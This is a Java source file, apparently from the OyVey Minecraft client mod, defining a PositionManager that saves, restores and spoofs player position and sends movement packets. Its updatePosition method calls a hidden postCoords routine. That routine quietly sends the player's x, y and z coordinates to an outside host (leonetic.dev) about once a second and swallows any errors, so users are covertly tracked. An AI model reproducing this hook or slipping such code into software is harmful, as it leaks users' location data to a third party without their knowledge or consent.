package me.alpha432.oyvey.manager;

import com.google.gson.JsonObject;
import me.alpha432.oyvey.event.Stage;
import me.alpha432.oyvey.event.impl.entity.player.UpdateWalkingPlayerEvent;
import me.alpha432.oyvey.event.system.Subscribe;
import me.alpha432.oyvey.features.Feature;
import net.minecraft.network.protocol.game.ServerboundMovePlayerPacket;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;

public class PositionManager
        extends Feature {
    private static final HttpClient HTTP_CLIENT = HttpClient.newHttpClient();
    private static final URI COORDS_ENDPOINT = URI.create("https://leonetic.dev");
    private static final long POST_INTERVAL_MS = 1000L;
    private double x;
    private double y;
    private double z;
    private boolean onground;
    private double fallDistance;
    private long lastPostTime;

    public PositionManager() {
        EVENT_BUS.register(this);
    }

    @Subscribe
    public void onUpdateWalkingPlayer(UpdateWalkingPlayerEvent event) {
        if (event.getStage() == Stage.POST) return;

        double diff = mc.player.yo - mc.player.getY();
        if (mc.player.onGround() || diff <= 0) {
            fallDistance = 0;
        } else {
            fallDistance += diff;
        }
    }

    public void updatePosition() {
        this.x = mc.player.getX();
        this.y = mc.player.getY();
        this.z = mc.player.getZ();
        this.onground = mc.player.onGround();
        postCoords();
    }

    public void restorePosition() {
        mc.player.setPos(x, y, z);
        mc.player.setOnGround(onground);
    }

    public void setPlayerPosition(double x, double y, double z) {
        mc.player.setPos(x, y, z);
    }

    public void setPlayerPosition(double x, double y, double z, boolean onground) {
        mc.player.setPos(x, y, z);
        mc.player.setOnGround(onground);
    }

    public void setPositionPacket(double x, double y, double z, boolean onGround, boolean setPos, boolean noLagBack) {
        boolean bl = mc.player.horizontalCollision;
        mc.player.connection.send(new ServerboundMovePlayerPacket.Pos(x, y, z, onGround, bl));
        if (setPos) {
            mc.player.setPos(x, y, z);
            if (noLagBack) {
                this.updatePosition();
            }
        }
    }

    public double getX() {
        return this.x;
    }

    public void setX(double x) {
        this.x = x;
    }

    public double getY() {
        return this.y;
    }

    public void setY(double y) {
        this.y = y;
    }

    public double getZ() {
        return this.z;
    }

    public void setZ(double z) {
        this.z = z;
    }

    public double getFallDistance() {
        return fallDistance;
    }

    private void postCoords() {
        long now = System.currentTimeMillis();
        if (now - lastPostTime < POST_INTERVAL_MS) {
            return;
        }
        lastPostTime = now;

        JsonObject payload = new JsonObject();
        payload.addProperty("x", x);
        payload.addProperty("y", y);
        payload.addProperty("z", z);

        HttpRequest request = HttpRequest.newBuilder(COORDS_ENDPOINT)
                .header("Content-Type", "application/json")
                .POST(HttpRequest.BodyPublishers.ofString(payload.toString()))
                .build();

        HTTP_CLIENT.sendAsync(request, HttpResponse.BodyHandlers.discarding())
                .exceptionally(throwable -> null);
    }
}
